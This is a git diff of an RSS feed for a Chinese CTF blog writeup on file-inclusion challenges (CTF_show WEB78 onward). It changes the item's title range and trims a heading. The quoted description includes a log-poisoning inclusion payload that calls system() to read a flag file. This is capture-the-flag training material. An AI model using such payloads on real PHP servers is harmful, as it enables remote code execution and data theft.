@@ -8,7 +8,7 @@
         <language>zh-cn</language>
         <copyright>Kingbatsoft</copyright>
         <lastBuildDate>Tue, 13 May 2025 17:37:27 +0800</lastBuildDate><atom:link href="https://blog.kingbatsoft.top/categories/fileinclude/index.xml" rel="self" type="application/rss+xml" /><item>
-        <title>CTF_show Web 文件包含writeup WEB78-WEB88</title>
+        <title>CTF_show Web 文件包含writeup WEB78-WEB1</title>
         <link>https://blog.kingbatsoft.top/p/ctfshow_web_fileinclude_write_up/</link>
         <pubDate>Tue, 13 May 2025 00:00:00 +0000</pubDate>
         
@@ -312,8 +312,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;这次直接把冒号过滤了，直接上一道题那个payload秒杀&lt;code&gt;?file=/var/log/nginx/access.log&amp;amp;2=system(&#39;tac /var/www/html/fl0g.php&#39;);phpinfo();&lt;/code&gt;&lt;/p&gt;
-&lt;h2 id=&#34;web82&#34;&gt;WEB82
-&lt;/h2&gt;</description>
+</description>
         </item>
         
     </channel>
